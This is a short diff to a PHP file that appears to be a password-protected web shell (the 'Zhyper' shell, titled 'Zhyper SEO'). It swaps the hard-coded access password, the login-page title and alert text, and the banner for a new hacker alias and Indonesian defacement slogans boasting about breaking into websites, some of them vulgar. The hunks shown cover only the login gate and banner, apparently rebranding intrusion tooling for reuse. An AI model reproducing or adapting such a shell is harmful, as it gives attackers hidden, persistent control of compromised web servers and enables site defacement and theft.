@@ -33,13 +33,13 @@ $Array = [
 	$_7 = array_merge($_POST, $_GET);
 	$_r = "required='required'";
 	$gcw = "getcwd";
-	$correctPassword = "zhyperflow"; //Change Password
+	$correctPassword = "kontolodon"; //Change Password
 	if (isset($_POST['pass'])) {
 		$enteredPassword = $_POST['pass'];
 		if ($enteredPassword === $correctPassword) {
 			$_SESSION['forbidden'] = true;
 		} else {
-			echo '<script>alert("Password Nya Salah Kawan");</script>';
+			echo '<script>alert("Password Nya Salah Bosku");</script>';
 		}
 	}
 	if (isset($_GET['logout'])) {
@@ -52,7 +52,7 @@ $Array = [
 	?>
 	<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<title>Zhyper Login</title>
+<title>Kontolodonzzz Login</title>
 <body>
 <style type="text/css">
 h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
@@ -133,8 +133,8 @@ window.onerror = ClearError;
 <h1>Zhyper SEO</h1>
  
  
-<div id="matrix" class="auto-style8">Zhyper IS HERE !!!</div><br>
-<font face="courier new" color="Red" size"10" >CITA CITA KU MENJADI SOPTEK AGAR KU BISA MENG KOKOP M****K
+<div id="matrix" class="auto-style8">Kontolodonzzz WAS HERE !!!</div><br>
+<font face="courier new" color="Red" size"10" >MENJEBOL WEB MU ADALAH JALAN NINJAKU
  </font>
  
  
